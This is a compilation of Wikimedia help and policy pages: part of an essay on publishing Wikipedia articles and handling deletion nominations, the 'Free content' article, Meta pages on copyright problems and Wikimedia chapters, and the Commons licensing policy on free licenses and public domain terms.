 * And immediately below that you will see "Reason:" and a box where you might type as an edit summary just why you are doing the move from userspace to mainspace. If the article is ready, you might simply type "article ready for mainspace" and then click on the "Move page" button.

It is just that simple to move something from a workspace into mainspace.


WHAT TO EXPECT

If you've done a decent job, the most you might expect is that others may come by to correct a typo or two, or perhaps modify a sentence. What's better is that another editor might appreciate your article enough to expand it a bit and add a few more sources... or better yet, expand it a lot and add many more sources.

But remember: what you contribute to Wikipedia is no longer "yours". It can be and quite often is edited, sometimes mercilessly, by other editors. But don't take it as a personal affront. Always remain polite and seek advice from those more experienced. And never think of your work as being owned by you. Once you hit "Publish changes" you're agreeing to the Terms of Use, and you irrevocably agree to release your contribution under the CC BY-SA 4.0 License and the GFDL... you're agreeing that what you contribute to Wikipedia now belongs to Wikipedia... the community as a whole.


OOPS... DID SOMEBODY TAG YOUR ARTICLE FOR DELETION?

Curses, even I got nominated for deletion.

Hopefully, nothing that you have contributed will become the subject of deletion. But if it does...

First off, don't fret. Don't get angry. Don't take it personally. And don't despair. It is hoped that by following the guide here that your article was pretty much set to go, so it may just be that the article needs a few tweaks to address the concerns of the tagger. First thing is you might ask the tagger on their talk page what you might do to address their concerns. More often than not, the tagger will be happy to give you a response with which you can work.

WHY AND HOW

Why and how something might be tagged for deletion is covered in depth at Wikipedia:Deletion policy, under the section "Reasons for deletion". Now generally, someone who sees a problem might use any of a variety of tags which can be added to articles to note the problem. See Wikipedia:Deletion policy#Tagging. But this does not always happen, and occasionally the concern is so major that an editor might determine that deletion is the only solution.

SPEEDY DELETION

Speedy deletion is meant to remove pages that are so obviously inappropriate for Wikipedia that they have no chance of surviving a deletion discussion. Speedy deletion should not be used except in the most obvious cases. An article can be tagged for speedy deletion if it meets one of the criteria for speedy deletion.

If ANY page you created is tagged for speedy deletion, you may use the "Contest this speedy deletion" button to explain your reasoning on the relevant talk page. The tag exists to give you some extra time and to tell the deleting administrator about things that they might not have realized. However, the page may still be deleted if it meets the speedy deletion criteria. There are more details about this at the section at "Speedy deletion".

PROPOSED DELETION

A little less imperative than a "speedy" is a "Proposed deletion" (often known as PROD) and it only applies to pages in the main namespace (like your article) and the file namespace (like images and media). When an editor feels that a page obviously and uncontroversially doesn't belong in this encyclopedia, but it does not fit the criteria for a "Speedy", it can be tagged for "proposed deletion". This gives you or others seven days in which to address concerns, after which time an administrator (a volunteer like any of us, but one with access to special editing tools) can delete the article or file. For how to deal with this, read the section at "Proposed deletion".

PROPOSED DELETION OF BIOGRAPHIES OF LIVING PEOPLE

As of April 3, 2010, a proposed deletion process for unsourced biographies was established, requiring all biographies of living persons to have at least one reliable source that supports at least one statement about the subject. Once the article is tagged in this manner, the {{prod blp}} tag may not be removed until such a source is provided. If none is forthcoming the article may be deleted after 10 days. This does not affect any other deletion process. For more details, please see Wikipedia:Proposed deletion of biographies of living people.

DELETION NOMINATION

If something does not fall into the categories above, it may be sent to a deletion discussion and be deleted, or not, based upon discussion by the community. This process is called "Articles for Deletion" or "AfD". Such deletion discussions are not decided through a head count; participants are encouraged to explain their opinion and refer to applicable policy and guideline. The discussion lasts at least seven full days and afterwards pages are deleted by an administrator if there is consensus to do so. For more detailed information, read "Deletion discussion".

HOW TO ACT / REACT

Worried or confused? Don't be. Wikipedia is built upon the principle that contributors and editors are acting in good faith to improve the body of articles, and even those who tagged your article for deletion are doing so in the interest of Wikipedia's integrity.

BE POLITE

In all cases, you should politely and civilly discuss the merits of your article.

FIXING THE PROBLEMS

Often, the tagger will create a deletion discussion page for your article and post it on the articles for deletion log, so the issues can be discussed and a consensus formed. This is your opportunity to articulate your case for the article, make additional edits, and provide more reliable resources to support your article. Your article may be tagged for assistance by the Article Rescue Squadron. Users who monitor the articles for deletion log and Article Rescue Squadron may participate in the discussion and provide edits to improve the article.

Your article might also benefit from article incubation, where it is moved from the main encyclopedia to a temporary location, the article incubator, where it can be worked on collaboratively prior to re-publishing.

The criteria for speedy deletion require an administrator's support to bypass the normal deletion discussion, and immediately delete Wikipedia pages or media at their discretion.

GRACIOUSNESS

The principles of professionalism, civility and graciousness are basic on Wikipedia, regardless of the outcome of the deletion discussion. It is polite to thank those who took the time to read your article and the discussions, and provided either advice, guidance, wisdom, or knowledge to help you grow as a Wikipedia contributor. If a response to your work seems to be short or even brusque, do not assume it was done with malice or spite. If something said was actually and intentionally done in malice or spite, trust that others will recognize and intercede. You're new. As you gain more experience here, you will learn the various steps of dispute resolution for dealing with such events if they occur. But that's a lesson for another day.

And to repeat yet again, if you have questions (and I'll be surprised if you don't), be willing to seek input and advice from others. Ask those questions. You will get answers.


MOVING ON

If your article is deleted, you might ask the closing editor to "userfy" the article into a special user workspace on user subpage, much like the sandbox in which it was first created. There you can continue to build the article in collaboration with other users, until it is ready for publishing.

Regardless, stick with it and continue to participate in Wikipedia, for it is the only way the community will thrive.


AND ON IMAGES

The requirements for uploading and using images in Wikipedia are a complex area because overall they serve two somewhat conflicting goals. One is to meet legal requirements for protecting the rights of owners of the images. The other is to amass content which can freely be redistributed. The result is a "minefield" of requirements and enforcement which essentially says that there are two viable routes for using images:

 1. Get the owner of the image to release it for nearly unlimited use (per one of the offered acceptable licenses), which is authorization for both non-commercial and commercial re-use with the only limitation being that the user must acknowledge the owner. Wikipedia does not accept other permissions with restrictions (such as "only for use by Wikipedia" or "only for non-profit use"). Some of the upload wizards offer those as trick questions; if you choose one of those it will cause your upload to crash and burn.
 2. "Fair use" This is the route that requires no permission from the owner of the image. In addition to fulfilling the real world legal requirements for such a use, there are additional Wikipedia requirements for this type of use which are designed to make it very difficult to use this route. This is done to encourage/force you to use #1 instead. So #1 is your best route if you can do it. Other than these notes, this essay is not discussing the use of images within your article because a comprehensive section on their use might be longer than what has been offered here already.

From Wikipedia, the free encyclopedia

Nonrestrictive creative work
For the use of free content on Wikipedia, see Wikipedia:Free content.



The logo on the screen in the subject's left hand is a Creative Commons license, while the paper in his right hand explains, in Khmer, that the image is open content.

Free content, libre content, libre information, or free information is any kind of creative work, such as a work of art, a book, a software program, or any other creative content for which there are very minimal copyright and other legal limitations on usage, modification and distribution. These are works or expressions which can be freely studied, applied, copied and modified by anyone for any purpose[1][better source needed] including, in some cases, commercial purposes. Free content encompasses all works in the public domain and also those copyrighted works whose licenses honor and uphold the definition of free cultural work.

In most countries, the Berne Convention grants copyright holders control over their creations by default. Therefore, copyrighted content must be explicitly declared free by the authors, which is usually accomplished by referencing or including licensing statements from within the work. The right to reuse such a work is granted by the authors in a license known as a free license, a free distribution license, or an open license, depending on the rights assigned. These freedoms given to users in the reuse of works (that is, the right to freely use, study, modify or distribute these works, possibly also for commercial purposes) are often associated with obligations (to cite the original author, to maintain the original license of the reused content) or restrictions (excluding commercial use, banning certain media) chosen by the author.[citation needed] There are a number of standardized licenses offering varied options that allow authors to choose the type of reuse of their work that they wish to authorize or forbid.


DEFINITION

There are a number of different definitions of free content in regular use. Legally, however, free content is very similar to open content. An analogy is a use of the rival terms free software and open-source, which describe ideological differences rather than legal ones.[2][self-published source?] The term Open Source, by contrast, sought to encompass them all in one movement.[3][4] For instance, the Open Knowledge Foundation's Open Definition describes "open" as synonymous with the definition of free in the "Definition of Free Cultural Works" (as also in the Open Source Definition and Free Software Definition).[5] For such free/open content both movements recommend the same three Creative Commons licenses, the CC BY, CC BY-SA, and CC0.[6][7][8][9]


LEGAL BACKGROUND


COPYRIGHT

Main article: Copyright
Copyright symbol

Copyright is a legal concept, which gives the author or creator of a work legal control over the duplication and public performance of their work. In many jurisdictions, this is limited by a time period after which the works then enter the public domain. Copyright laws are a balance between the rights of creators of intellectual and artistic works and the rights of others to build upon those works. During the time period of copyright the author's work may only be copied, modified, or publicly performed with the consent of the author, unless the use is a fair use. Traditional copyright control limits the use of the work of the author to those who either pay royalties to the author for usage of the author's content or limit their use to fair use. Secondly, it limits the use of content whose author cannot be found.[10] Finally, it creates a perceived barrier between authors by limiting derivative works, such as mashups and collaborative content.[11] Although open content has been described as a counterbalance to copyright, open content licenses rely on a copyright holder's power to license their work, as copyleft which also utilizes copyright for such a purpose.[12]


PUBLIC DOMAIN

Main article: Public domain
Public domain logo

The public domain is a range of creative works whose copyright has expired or was never established, as well as ideas and facts[note 1] which are ineligible for copyright. A public domain work is a work whose author has either relinquished to the public or no longer can claim control over, the distribution and usage of the work. As such, any person may manipulate, distribute, or otherwise use the work, without legal ramifications. A work in the public domain or released under a permissive license may be referred to as "copycenter".[13]


COPYLEFT

Main article: Copyleft
Copyleft symbol

Copyleft is a play on the word copyright and describes the practice of using copyright law to remove restrictions on distributing copies and modified versions of a work.[14] The aim of copyleft is to use the legal framework of copyright to enable non-author parties to be able to reuse and, in many licensing schemes, modify content that is created by an author. Unlike works in the public domain, the author still maintains copyright over the material, however, the author has granted a non-exclusive license to any person to distribute, and often modify, the work. Copyleft licenses require that any derivative works be distributed under the same terms and that the original copyright notices be maintained. A symbol commonly associated with copyleft is a reversal of the copyright symbol, facing the other way; the opening of the C points left rather than right. Unlike the copyright symbol, the copyleft symbol does not have a codified meaning.[15]


USAGE

Projects that provide free content exist in several areas of interest, such as software, academic literature, general literature, music, images, video, and engineering. Technology has reduced the cost of publication and reduced the entry barrier sufficiently to allow for the production of widely disseminated materials by individuals or small groups. Projects to provide free literature and multimedia content have become increasingly prominent owing to the ease of dissemination of materials that are associated with the development of computer technology. Such dissemination may have been too costly prior to these technological developments.


MEDIA

Creative Commons logo

In media, which includes textual, audio, and visual content, free licensing schemes such as some of the licenses made by Creative Commons have allowed for the dissemination of works under a clear set of legal permissions. Not all Creative Commons licenses are entirely free; their permissions may range from very liberal general redistribution and modification of the work to a more restrictive redistribution-only licensing. Since February 2008, Creative Commons licenses which are entirely free carry a badge indicating that they are "approved for free cultural works".[16] Repositories exist which exclusively feature free material and provide content such as photographs, clip art, music,[17] and literature.[18] While extensive reuse of free content from one website in another website is legal, it is usually not sensible because of the duplicate content problem. Wikipedia is amongst the most well-known databases of user-uploaded free content on the web. While the vast majority of content on Wikipedia is free content, some copyrighted material is hosted under fair-use criteria.


SOFTWARE

Main article: Free and open-source software
OSI logo

Free and open-source software, which is often referred to as open source software and free software, is a maturing technology with companies using them to provide services and technology to both end-users and technical consumers. The ease of dissemination increases modularity, which allows for smaller groups to contribute to projects as well as simplifying collaboration. Some claim that open source development models offer similar peer-recognition and collaborative benefit incentive as in more classical fields such as scientific research, with the social structures that result leading to decreased production costs.[19]

Free Software Foundation logo

Given sufficient interest in a software component, by using peer-to-peer distribution methods, distribution costs may be reduced, easing the burden of infrastructure maintenance on developers. As distribution is simultaneously provided by consumers, these software distribution models are scalable; that is, the method is feasible regardless of the number of consumers. In some cases, free software vendors may use peer-to-peer technology as a method of dissemination.[20] Project hosting and code distribution is not a problem for most free projects as a number of providers offer these services free of charge.


ENGINEERING AND TECHNOLOGY

Main articles: Open-source hardware and Open-design movement
Logo of the Open Source Hardware Association

Free content principles have been translated into fields such as engineering, where designs and engineering knowledge can be readily shared and duplicated, in order to reduce overheads associated with project development. Open design principles can be applied in engineering and technological applications, with projects in mobile telephony, small-scale manufacture,[21] the automotive industry,[22][23] and even agricultural areas. Technologies such as distributed manufacturing can allow computer-aided manufacturing and computer-aided design techniques to be able to develop small-scale production of components for the development of new, or repair of existing, devices. Rapid fabrication technologies underpin these developments, which allow end-users of technology to be able to construct devices from pre-existing blueprints, using software and manufacturing hardware to convert information into physical objects.


ACADEMIA

Main article: Open access

In academic work, the majority of works are not free, although the percentage of works that are open access is growing. Open access refers to online research outputs that are free of all restrictions to access and free of many restrictions on use (e.g. certain copyright and license restrictions).[24] Authors may see open access publishing as a way of expanding the audience that is able to access their work to allow for greater impact, or support it for ideological reasons.[25][26] Open access publishers such as PLOS and BioMed Central provide capacity for review and publishing of free works; such publications are currently more common in science than humanities. Various funding institutions and governing research bodies have mandated that academics must produce their works to be open-access, in order to qualify for funding, such as the US National Institutes of Health, Research Councils UK (effective 2016) and the European Union (effective 2020).[27][28][29]

Open access symbol, originally designed by PLOS

At an institutional level, some universities, such as the Massachusetts Institute of Technology, have adopted open access publishing by default by introducing their own mandates.[30] Some mandates may permit delayed publication and may charge researchers for open access publishing.[31][32] For teaching purposes, some universities, including MIT, provide freely available course content, such as lecture notes, video resources and tutorials. This content is distributed via Internet to the general public. Publication of such resources may be either by a formal institution-wide program,[33] or informally, by individual academics or departments.

Open content publication has been seen as a method of reducing costs associated with information retrieval in research, as universities typically pay to subscribe for access to content that is published through traditional means.[9][34] Subscriptions for non-free content journals may be expensive for universities to purchase, though the articles are written and peer-reviewed by academics themselves at no cost to the publisher. This has led to disputes between publishers and some universities over subscription costs, such as the one that occurred between the University of California and the Nature Publishing Group.[35][36]


EDUCATION

Unesco's Open Educational Resources logo
Main articles: Open educational resources and Open textbook

Free and open content has been used to develop alternative routes towards higher education. Open content is a free way of obtaining higher education that is "focused on collective knowledge and the sharing and reuse of learning and scholarly content."[37] There are multiple projects and organizations that promote learning through open content, including OpenCourseWare and Khan Academy. Some universities, like MIT, Yale, and Tufts are making their courses freely available on the internet.[38]

There are also a number of organizations promoting the creation of openly licensed textbooks such as the University of Minnesota's Open Textbook Library, Connexions, OpenStax College, the Saylor Academy, Open Textbook Challenge, and Wikibooks.[citation needed]


LEGISLATION

This section does not cite any sources. Please help improve this section by adding citations to reliable sources. Unsourced material may be challenged and removed. (July 2024) (Learn how and when to remove this message)

Any country has its own law and legal system, sustained by its legislation, which consists of documents. In a democratic country, laws are published as open content, in principle free content; but in general, there are no explicit licenses attributed for the text of each law, so the license must be assumed as an implied license. Only a few countries have explicit licenses in their law-documents, as the UK's Open Government Licence (a CC BY compatible license). In the other countries, the implied license comes from its proper rules (general laws and rules about copyright in government works). The automatic protection provided by the Berne Convention does not apply to the texts of laws: Article 2.4 excludes the official texts from the automatic protection. It is also possible to "inherit" the license from context. The set of country's law-documents is made available through national repositories. Examples of law-document open repositories: LexML Brazil, Legislation.gov.uk, and N-Lex. In general, a law-document is offered in more than one (open) official version, but the main one is that published by a government gazette. So, law-documents can eventually inherit license expressed by the repository or by the gazette that contains it.


HISTORY

This section needs to be updated. The reason given is: The Open Content Project was replaced by Creative Commons over 10 years ago. Please help update this article to reflect recent events or newly available information. (July 2024)


ORIGINS AND OPEN CONTENT PROJECT

The concept of applying free software licenses to content was introduced by Michael Stutz, who in 1997 wrote the paper "Applying Copyleft to Non-Software Information" for the GNU Project.[39] The term "open content" was coined by David A. Wiley in 1998 and evangelized via the Open Content Project, describing works licensed under the Open Content License (a non-free share-alike license, see 'Free content' below) and other works licensed under similar terms.[40]

The website of the Open Content Project once defined open content as 'freely available for modification, use and redistribution under a license similar to those used by the open-source / free software community'.[40] However, such a definition would exclude the Open Content License because that license forbids charging for content; a right required by free and open-source software licenses.[citation needed]


5RS DEFINITION

Open Content Project logo, 1998

It has since come to describe a broader class of content without conventional copyright restrictions. The openness of content can be assessed under the '5Rs Framework' based on the extent to which it can be retained, reused, revised, remixed and redistributed by members of the public without violating copyright law.[41] Unlike free content and content under open-source licenses, there is no clear threshold that a work must reach to qualify as 'open content'.

The 5Rs are put forward on the Open Content Project website as a framework for assessing the extent to which content is open:

>  1. Retain – the right to make, own, and control copies of the content (e.g., download, duplicate, store, and manage)
>  2. Reuse – the right to use the content in a wide range of ways (e.g., in a class, in a study group, on a website, in a video)
>  3. Revise – the right to adapt, adjust, modify, or alter the content itself (e.g., translate the content into another language)
>  4. Remix – the right to combine the original or revised content with other open content to create something new (e.g., incorporate the content into a mashup)
>  5. Redistribute – the right to share copies of the original content, your revisions, or your remixes with others (e.g., give a copy of the content to a friend)[41]

This broader definition distinguishes open content from open-source software, since the latter must be available for commercial use by the public. However, it is similar to several definitions for open educational resources, which include resources under noncommercial and verbatim licenses.[42][43]


SUCCESSOR PROJECTS

In 2003, David Wiley announced that the Open Content Project had been succeeded by Creative Commons and their licenses; Wiley joined as "Director of Educational Licenses".[44][45]

In 2005, the Open Icecat project was launched, in which product information for e-commerce applications was created and published under the Open Content License. It was embraced by the tech sector, which was already quite open source minded.

In 2006, a Creative Commons' successor project, the Definition of Free Cultural Works, was introduced for free content.[46] It was put forth by Erik Möller, Richard Stallman, Lawrence Lessig, Benjamin Mako Hill, Angela Beesley, and others.[47] The Definition of Free Cultural Works is used by the Wikimedia Foundation.[48] In 2009, the Attribution and Attribution-ShareAlike Creative Commons licenses were marked as "Approved for Free Cultural Works".[49]

OPEN KNOWLEDGE FOUNDATION

Open Knowledge Foundation

Another successor project is the Open Knowledge Foundation, founded by Rufus Pollock in Cambridge, in 2004[50] as a global non-profit network to promote and share open content and data.[51]

In 2007 the OKF gave an Open Knowledge Definition for "content such as music, films, books; data be it scientific, historical, geographic or otherwise; government and other administrative information".[52] In October 2014 with version 2.0 Open Works and Open Licenses were defined and "open" is described as synonymous to the definitions of open/free in the Open Source Definition, the Free Software Definition, and the Definition of Free Cultural Works.[53]

A distinct difference is the focus given to the public domain, open access, and readable open formats. OKF recommends six conformant licenses: three of OKN's (Open Data Commons Public Domain Dedication and Licence, Open Data Commons Attribution License, Open Data Commons Open Database License) and the CC BY, CC BY-SA, and CC0 Creative Commons licenses.[54][55][56]

From Meta, a Wikimedia project coordination wiki


Most of the larger projects have a specific page where copyright problems can be listed and resolved by community consensus. This page is intended as a central resource, linking to these pages by language. (The original idea for this page arose from the rewrite of the Wikimedia Terms of use in fall 2011.)

Where there is no specific page for copyright problems, these can be raised on the general Community discussion pages linked from the "Community" menu on the page left hand side.

"Local chapter/s" redirects here. To see other possible uses, see Chapters, a disambiguation page.

Wikimedia chapters are independent organizations founded to support and promote the Wikimedia projects in a specified geographical region (in most cases, a country). Like the Wikimedia Foundation, they aim to "empower and engage people around the world to collect and develop educational content under a free license or in the public domain, and to disseminate it effectively and globally". There are currently 38 chapters, with at least one on every inhabited continent.

This page lists current and planned chapters. Please see the step-by-step chapter creation guide and the movement affiliates FAQ for more information. The Affiliations Committee advises on and assists the creation of and to support affiliates.

Some chapters have an office.

Find an overview of chapter-related Meta pages on Chapters Portal.

Existing chapters, both founded (dark blue) and approved (dark turquoise), planned chapters (green), and chapters in discussion (light blue) as of 23 December 2024.

There is no further plan for forming a chapter before the NPO can be freely incorporated in mainland China.
 * Wikimedia Japan – 設立の是非について投票中です。 The page reads "There are currently no active arguments to establish a local Japanese chapter, mainly because very few Japanese language community members are interested in it. Lack of legal knowledge and accounting skills among the community is also a large contributing factor."

MAILING LISTS AND WIKIS

Apart from public mailing lists (most notably Chapters-reports) and websites listed elsewhere, there are two main private channels for communication and coordination among chapters, which existing chapters must follow and participate in:

 * Internal wiki[24] and Internal-l – Local Chapters, board and officers coordination: each chapter can subscribe an unlimited number of board members (as of 13th August 2010), with an e-mail to the list admin by the president; additional members can be subscribed following the usual procedure (endorsement by a subscribed person + consensus on wiki);
 * Chapters wiki[25] and chapters mailinglist[26] for discussions and decisions among chapters: each chapter can subscribe unlimited board members (and some staffer) and an email by the president of the chapter to the list admins with the list of email addresses to add/remove is the usual process; there are also other lists for working groups, generally subsets of the previous one, apart some more open lists (e.g. GLAM).

NOTES

 1.  ↑ Is the chapter formally recognized as a Nonprofit organization under its nation's laws? "n/a" should be used if the country's laws do not recognize a nonprofit status.
 2.  ↑ corporation information
 3.  ↑ A small no profit association doesn't require the formal approval. It's sufficient to follow the law and to have a bylaws compliant with to the law[1][2]. The tax exemption has been formally approved [3].
 4.  ↑ All associations are non-profit by definition in the Czech republic.
 5.  ↑ All associations in Spain have Non profit status.
 6.  ↑ Wikimédia Magyarország is a registered association at the Court and all registered associations are non-profit by definition in Hungary. Wikimédia Magyarország is recognized as "organization for the public benefit" status which means: transparency requirements, tax exemptions, tax deductibility etc.
 7.  ↑ Based on Wikimedia Indonesia Board of Executive Meeting.
 8.  ↑ Officially approved by Ministry of Culture, Sports and Tourism of South Korea since 2015.
 9.  ↑ At the founding team's request, the provisional approval was extended by the WMF executive director until April 2013.
 10. ↑ Officialy recognized as Wikimedia México A.C. (civic association) under Mexican laws since February 2013.
 11. ↑ There is no separate official non-profit status. However, we have been granted charity status (ANBI) by the tax office since January 2010, which, among other demands, requires that the organization is a non-profit by its bylaws and operates as a non-profit in practice. During 2012 we were busy to prepare the chapter for the CBF certificate for 'small charities'.

This page is considered an official policy on Wikimedia Commons.

It has wide acceptance among editors and is considered a standard that everyone must follow. Except for minor edits (such as fixing typos, or bringing information up to date), please make use of the discussion page to propose changes to this policy.

This page gives non-lawyers an overview of complicated copyright laws through an example-based tutorial. It aims to help uploaders decide whether an image or other media file is acceptable on Wikimedia Commons. If you are a re-user looking for information on how to use Commons content in your own work, see Commons:Reusing content outside Wikimedia.

Wikimedia Commons only accepts free content, that is, images and other media files that are not subject to copyright restrictions which would prevent them being used by anyone, anytime, for any purpose. The use may however be restricted by issues not related to copyright, though, see Commons:Non-copyright restrictions, and the license may demand some special measures. There is also certain material, the copyrights of which have expired in one country while still applying in another. Some of the details are explained below. Wikimedia Commons tries to ensure that any such restrictions are mentioned on the image description page; however, it is the responsibility of reusers to ensure that the use of the media is according to the license and violates no applicable law.

Wikimedia Commons only accepts media

 * that are explicitly freely licensed, or
 * that are in the public domain in at least the United States and in the source country of the work.

Wikimedia Commons does not accept fair use justifications: see Commons:Fair use. Media licensed exclusively under non-commercial only licenses (like CC BY-NC-SA) are not accepted either.

The license that applies to an image or media file must be indicated clearly on the file description page using a copyright tag. All information required by that license must be provided on the description page. The information given on the description page should be sufficient to allow others to verify the license status. It would be best to do this immediately in the summary field on the upload form.

If you are a copyright holder and would like to confirm permission, please use the email template to send it via VRT.

A quick but not entirely accurate introduction




ACCEPTABLE LICENSES

A copyright license is a formal permission stating who may use a copyrighted work and how they may use it. A license can only be granted by the copyright holder, which is usually the author (photographer, painter or similar).

This cartoon explains why Commons does not accept "noncommercial" licenses. Click to view the full-size image.

All copyrighted material on Commons (not in the public domain) must be licensed under a free license that specifically and irrevocably allows anyone to use the material for any purpose; simply writing that "the material may be used freely by anyone" or similar isn't sufficient. In particular, the license must meet the following conditions:

 * Republication and distribution must be allowed.
 * Publication of derivative work must be allowed.
 * Commercial use of the work must be allowed.
 * The license must be perpetual (non-expiring) and non-revocable.
 * Acknowledgment of all authors/contributors of a work may be required.
 * Publication of derivative work under the same license may be required.
 * For digital distribution, use of open file formats free of digital restrictions management (DRM) may be required.

Sometimes, authors wish to release a lower quality or lower resolution version of an image or video under a free license, while applying stricter terms to higher quality versions. It is unclear whether such a distinction is legally enforceable, but Commons's policy is to respect the copyright holder's intentions by hosting only the lower quality version.

The following restrictions must not apply to the image or other media file:

 * Use by Wikimedia only.
 * Non-commercial, educational, personal, or editorial use only.
 * Use under fair use only.
 * Notification of the creator required, rather than requested, for all or for some uses.

For example, the following are generally not allowed:

 * Screenshots of software that is itself not under a free license. However, screenshots of software under the GPL or a similar free software license are generally considered to be OK. See Commons:Screenshots.
 * TV/DVD/video game screenshots. See Commons:Screenshots.
 * Scans or reproductive photographs of copyrighted artwork, especially book covers, album/CD covers, etc. See Commons:Derivative works.
 * Copyrighted symbols, logos, etc. (Not to be confused with trademarks.)
 * Models, masks, toys, and other objects which represent a copyrighted work, such as a cartoon or movie character (rather than just a particular actor, regardless of a specific role). See Commons:Derivative works.

Commons also allows works that are not protected by copyright (i.e. works in the public domain). Please read the section about public domain below.

For an explanation of the justification for this licensing policy, see Commons:Licensing/Justifications.


MULTI-LICENSING

This cartoon demonstrates the utility of including a Creative Commons license. Click to view the full-size image.

You can offer as many licenses for a file as you want as long as at least one of them meets the criteria for free licenses above. For example, files may be licensed with both Creative Commons Attribution-ShareAlike (meets the criteria) and Attribution-NonCommercial (does not meet the criteria). In this example, re-users would be given the option to create derivatives using a compatible license (ShareAlike) or use a different licensing model and be restricted to NonCommercial use. A re-user who opts for the latter may however not upload their derivative work to Commons, as Attribution-NonCommercial does not meet the criteria for a free license.

Multi-Licensing with restrictive licenses may be desirable for compatibility with the licensing scheme of other projects; also, multi-licensing allows people who create derivative work to release that work under a restrictive license only, if they wish—that is, it gives creators of derivative works more freedom with regards to which license they may use for their work. See Commons:Multi-licensing.

 *  Again, works in the public domain are also accepted (see below).

See Commons:Copyright tags for more licenses.


FORBIDDEN LICENSES

Works which are not available under a license which meets the Definition of Free Cultural Works are explicitly not allowed. See the Wikimedia Foundation board resolution on licensing for more information.

Some examples of licensing statuses commonly found on the Internet, but forbidden on Commons, include:

 * Creative Commons Non-Commercial Only (-NC) licenses
 * Creative Commons No-Derivatives (-ND) licenses
 * Unlicensed material usable only under fair use, fair dealing, or other similar legal exceptions (see below for the reasons)
 * GNU Free Documentation License (GFDL), under certain conditions (see below)

Non-permitted licenses may only be used on Commons if the work is multi-licensed under at least one permitted license.

If an image is not OK, consider asking the author to release their work under a free license such as CC BY (Creative Commons Attribution license), or CC BY-SA (Creative Commons Attribution-ShareAlike).




GNU FREE DOCUMENTATION LICENSE

The GNU Free Documentation License (GFDL) is not practical for most content, especially for printed media, because it requires that they be published along with the full text of the license. Thus, it is preferable to publish the work with a dual license, adding to the GFDL a license that permits use of the photo or text easily; a Creative Commons license, for example. Also, do not use the GPL and LGPL licenses as the only license for your own works if it can be avoided, as they are not really suitable for anything but software.

GFDL is not permitted as the only acceptable license where all of the following are true:

 * The content was licensed on or after 15 October 2018. The licensing date is considered, not the creation or upload date.
 * The content is primarily a photograph, painting, drawing, audio or video.
 * The content is not a software logo, diagram or screenshot that is extracted from a GFDL software manual.


LICENSE INFORMATION

Shortcut
 * COM:LI

Example image with the recommended detailed image description (see image page)

All description pages on Commons must indicate clearly under which license the materials were published, and must contain the information required by the license (author, etc.) and should also contain information sufficient for others to verify the license status even when not required by the license itself or by copyright laws.

Specifically, the following information must be given on the description page, regardless if the license requires it or not:

 * The License that applies to the material. This must be done using a copyright tag.
 * The Source of the material. If the uploader is the author, this should be stated explicitly. (e.g. "Created by uploader", "Self-made", "Own work", etc.) Otherwise, please include a web link or a complete citation if possible. Note: Things like "Transferred from Wikipedia" are generally not considered a valid source unless that is where it was originally published. The primary source should be provided.
 * The Author/Creator of the image or media file. For media that are considered to be in the public domain because the copyright has expired, the date of death of the author may also be crucial (see the section about public domain material below). A generic license template which implies that the uploader is the copyright holder (e.g. {{PD-self}}) is no substitution for this requirement. The only exceptions to this is if the author wishes to remain anonymous or in certain cases where the author is unknown but enough information exists to show the work is truly in the public domain (such as the date of creation/publication).

Of less importance, but should always be provided if possible:

 * The Description of the image or media file. What is it of? How was it created?
 * The Date and place of creation. For media that are considered to be in the public domain because the copyright has expired, the date of creation may be crucial (see the section about public domain material below).

These points of the description can be done at best using the Information template. For usage of this template see Commons:First steps/Quality and description.


SCOPE OF LICENSING

In some cases, a document (media file) may have multiple aspects that can and have to be licensed: Every person that contributed a critical part of the work has rights to the results, and all have to make their contribution available under a free license—see derivative work. However, the distinctions are unclear and may differ from country to country. Here are a few examples to clarify:

 * For a music recording, the following aspects must be taken into account, and each must be under a free license (or in the public domain):
   * The score of the music (rights by the composer)
   * The lyrics of the song (rights by the writer)
   * The performance (rights by the performers)
   * The recording (rights by the technical personnel / recording company)
 * For a picture of artwork (also book covers and the like), it is similar:
   * The creator of the original artwork has rights to any reproductions and derivative work.
   * The photographer has rights to the image, if it is not a plain reproduction of the original.
 * For a picture of a building or a public art (like a sculptural monument or a mural), note that the architect or the artist may hold some rights if distinct architectural or artistic features are shown, but see also Commons:Freedom of panorama.

This is often problematic, if the artwork is not the primary content of the image or is not clearly recognizable: in that case, usually only the creator of the resulting picture (recording, etc.) holds a copyright. For instance, when taking a photograph of a group of people in a museum, the photo may also show some paintings on the walls. In that case the copyright of those paintings does not have to be taken into account. The distinction however is not very clear. The Commons:De minimis policy has more information about this concept.

Note that the license for all aspects has to be determined and mentioned explicitly. Also note that most reproductions do not allow the person doing the reproduction to claim a new copyright; the creator of a digital image / reproduction of a picture owns no new copyright to the resulting digital image. The only relevant copyright is that of the original picture. This also applies to Screenshots.


MATERIAL IN THE PUBLIC DOMAIN

Shortcut
 * COM:PD

Further information: Help:Public domain

Material released under a license like CC0 is considered the equivalent of public domain material; works that lack originality and edicts are in the public domain; a few governments around the world, including the US Federal, California, and Florida governments place most of their works, including most of their public records in the public domain; the English Wikipedia's guideline on public domain material more precisely defines these many exceptions.

Commons accepts material that is in the public domain, that is, documents allowed by the above exception, or that are not eligible to copyright, or for which the copyright has expired. But the "public domain" is complicated; copyright laws vary between countries, and thus a work may be in the public domain in one country, but still be copyrighted in another country. There are international treaties such as the Berne Convention that set some minimum standards, but individual countries are free to go beyond these minimums. A general rule of thumb is that if the creator of a work has been deceased for more than 70 years, their works are in the public domain in the country the creator was a citizen of and in the country where the work was first published. If the work is anonymous or a collaborative work (e.g. an encyclopedia), it is typically in the public domain 70 years after the date of the first publication. If the author is unknown after an extensive search, a work may be presumed to be in the public domain 120 years after creation (see {{PD-old-assumed}} for more details).

Many countries use such a copyright term of 70 years. A notable exception is the U.S. Due to historical circumstances, the United States has more complex rules:

 * Works published before 1930 are in the public domain.
 * For works first published before 1964, copyright lasts 28 years after publication, and is therefore currently expired unless the owner filed for renewal during the window between 27 and 28 years after publication.
   
   If renewed during that window, copyright lasts until 95 years after first publication.
   
   The large majority of works published before 1964 have passed into the public domain, but it is imperative to determine that copyright was not renewed. (The US Copyright Office online catalog can be used to search for renewals in 1978 or later—useful for works published in 1951 through 1963; Google has scans of the paper catalog including works registered from 1923 up to 1978).

 * For works first published before 1978: until 95 years after the first publication.
 * For works first published 1978 or later: until 70 years after the author's death. Anonymous works or work made for hire: until the shorter of 95 years since the first publication or 120 years since the creation of the work.

For works created before 1978 but only published 1978 or later, there are some special rules. These terms apply in the U.S. also for foreign works.

